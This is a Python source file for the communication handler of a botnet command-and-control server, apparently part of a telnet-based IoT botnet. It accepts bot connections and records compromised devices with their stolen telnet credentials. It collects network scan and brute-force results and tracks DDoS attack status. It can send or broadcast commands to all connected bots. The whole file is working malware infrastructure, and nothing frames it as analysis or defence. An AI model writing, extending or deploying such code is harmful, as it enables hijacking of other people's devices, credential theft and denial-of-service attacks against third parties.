#!/usr/bin/env python3
"""
Communication handler for C2 Server
Manages bot connections and command distribution
"""

import socket
import threading
import json
import time
from typing import Dict, List, Optional
from database import C2Database

class BotConnection:
    def __init__(self, conn: socket.socket, addr: tuple, db: C2Database):
        self.conn = conn
        self.addr = addr
        self.db = db
        self.authenticated = False
        self.bot_info = {}
    
    def handle_connection(self):
        """Handle individual bot connection"""
        try:
            while True:
                data = self.conn.recv(4096).decode('utf-8')
                if not data:
                    break
                
                try:
                    message = json.loads(data)
                    response = self.process_message(message)
                    self.conn.send(json.dumps(response).encode('utf-8'))
                except json.JSONDecodeError:
                    error_response = {"status": "error", "message": "Invalid JSON"}
                    self.conn.send(json.dumps(error_response).encode('utf-8'))
                    
        except Exception as e:
            print(f"Error handling bot connection from {self.addr}: {e}")
        finally:
            self.conn.close()
    
    def process_message(self, message: Dict) -> Dict:
        """Process incoming message from bot"""
        msg_type = message.get('type')
        
        if msg_type == 'register':
            return self.handle_registration(message)
        elif msg_type == 'heartbeat':
            return self.handle_heartbeat(message)
        elif msg_type == 'scan_result':
            return self.handle_scan_result(message)
        elif msg_type == 'credential_result':
            return self.handle_credential_result(message)
        elif msg_type == 'ddos_status':
            return self.handle_ddos_status(message)
        else:
            return {"status": "error", "message": "Unknown message type"}
    
    def handle_registration(self, message: Dict) -> Dict:
        """Handle bot registration"""
        try:
            bot_ip = message.get('bot_ip', self.addr[0])
            username = message.get('username')
            password = message.get('password')
            device_type = message.get('device_type', 'unknown')
            
            if username and password:
                success = self.db.add_compromised_device(
                    bot_ip, 23, username, password, device_type
                )
                
                if success:
                    self.authenticated = True
                    self.bot_info = {
                        'ip': bot_ip,
                        'username': username,
                        'device_type': device_type
                    }
                    
                    return {
                        "status": "success",
                        "message": "Bot registered successfully",
                        "bot_id": bot_ip
                    }
            
            return {"status": "error", "message": "Invalid registration data"}
            
        except Exception as e:
            return {"status": "error", "message": f"Registration failed: {e}"}
    
    def handle_heartbeat(self, message: Dict) -> Dict:
        """Handle bot heartbeat"""
        if self.authenticated:
            bot_ip = self.bot_info.get('ip', self.addr[0])
            self.db.update_bot_status(bot_ip, 'active')
            
            return {
                "status": "success",
                "timestamp": time.time(),
                "commands": self.get_pending_commands(bot_ip)
            }
        
        return {"status": "error", "message": "Not authenticated"}
    
    def handle_scan_result(self, message: Dict) -> Dict:
        """Handle network scan results from bot"""
        try:
            results = message.get('results', [])
            
            for result in results:
                self.db.add_scan_result(
                    result['ip'],
                    result['port'],
                    result.get('service', 'telnet'),
                    result['status']
                )
            
            return {"status": "success", "message": "Scan results received"}
            
        except Exception as e:
            return {"status": "error", "message": f"Failed to process scan results: {e}"}
    
    def handle_credential_result(self, message: Dict) -> Dict:
        """Handle credential brute force results"""
        try:
            results = message.get('results', [])
            
            for result in results:
                self.db.add_credential_attempt(
                    result['ip'],
                    result.get('port', 23),
                    result['username'],
                    result['password'],
                    result['success']
                )
                
                # If successful, register as compromised device
                if result['success']:
                    self.db.add_compromised_device(
                        result['ip'],
                        result.get('port', 23),
                        result['username'],
                        result['password']
                    )
            
            return {"status": "success", "message": "Credential results received"}
            
        except Exception as e:
            return {"status": "error", "message": f"Failed to process credential results: {e}"}
    
    def handle_ddos_status(self, message: Dict) -> Dict:
        """Handle DDoS attack status updates"""
        try:
            attack_id = message.get('attack_id')
            status = message.get('status')
            
            # Update attack status in database if needed
            # This could be expanded for more detailed tracking
            
            return {"status": "success", "message": "Status update received"}
            
        except Exception as e:
            return {"status": "error", "message": f"Failed to process status update: {e}"}
    
    def get_pending_commands(self, bot_ip: str) -> List[Dict]:
        """Get pending commands for bot (placeholder for future implementation)"""
        # This would query the database for pending commands
        # For now, return empty list
        return []

class C2CommunicationHandler:
    def __init__(self, host: str = '0.0.0.0', port: int = 8080, db: C2Database = None):
        self.host = host
        self.port = port
        self.db = db or C2Database()
        self.running = False
        self.server_socket = None
        self.active_connections = {}
    
    def start_server(self):
        """Start the C2 communication server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(100)
            
            self.running = True
            print(f"C2 Server listening on {self.host}:{self.port}")
            
            while self.running:
                try:
                    conn, addr = self.server_socket.accept()
                    print(f"New connection from {addr}")
                    
                    # Create bot connection handler
                    bot_conn = BotConnection(conn, addr, self.db)
                    
                    # Start thread to handle this connection
                    thread = threading.Thread(
                        target=bot_conn.handle_connection,
                        daemon=True
                    )
                    thread.start()
                    
                    # Store active connection
                    self.active_connections[addr[0]] = {
                        'connection': bot_conn,
                        'thread': thread,
                        'connected_at': time.time()
                    }
                    
                except socket.error as e:
                    if self.running:
                        print(f"Socket error: {e}")
                    
        except Exception as e:
            print(f"Failed to start C2 server: {e}")
        finally:
            if self.server_socket:
                self.server_socket.close()
    
    def stop_server(self):
        """Stop the C2 communication server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        print("C2 Server stopped")
    
    def send_command_to_bot(self, bot_ip: str, command: str, parameters: Dict = None) -> bool:
        """Send command to specific bot"""
        try:
            if bot_ip in self.active_connections:
                conn_info = self.active_connections[bot_ip]
                bot_conn = conn_info['connection']
                
                command_msg = {
                    "type": "command",
                    "command": command,
                    "parameters": parameters or {},
                    "timestamp": time.time()
                }
                
                bot_conn.conn.send(json.dumps(command_msg).encode('utf-8'))
                return True
            else:
                print(f"Bot {bot_ip} not connected")
                return False
                
        except Exception as e:
            print(f"Failed to send command to bot {bot_ip}: {e}")
            return False
    
    def broadcast_command(self, command: str, parameters: Dict = None) -> int:
        """Broadcast command to all connected bots"""
        success_count = 0
        
        for bot_ip in list(self.active_connections.keys()):
            if self.send_command_to_bot(bot_ip, command, parameters):
                success_count += 1
        
        return success_count
    
    def get_connected_bots(self) -> List[str]:
        """Get list of currently connected bot IPs"""
        return list(self.active_connections.keys())
    
    def cleanup_inactive_connections(self, timeout: int = 300):
        """Remove inactive connections after timeout"""
        current_time = time.time()
        inactive_bots = []
        
        for bot_ip, conn_info in self.active_connections.items():
            if current_time - conn_info['connected_at'] > timeout:
                inactive_bots.append(bot_ip)
        
        for bot_ip in inactive_bots:
            del self.active_connections[bot_ip]
            self.db.update_bot_status(bot_ip, 'inactive')
            print(f"Removed inactive bot: {bot_ip}")

if __name__ == "__main__":
    # Test the communication handler
    db = C2Database()
    comm_handler = C2CommunicationHandler(db=db)
    
    try:
        comm_handler.start_server()
    except KeyboardInterrupt:
        print("\nShutting down C2 server...")
        comm_handler.stop_server()
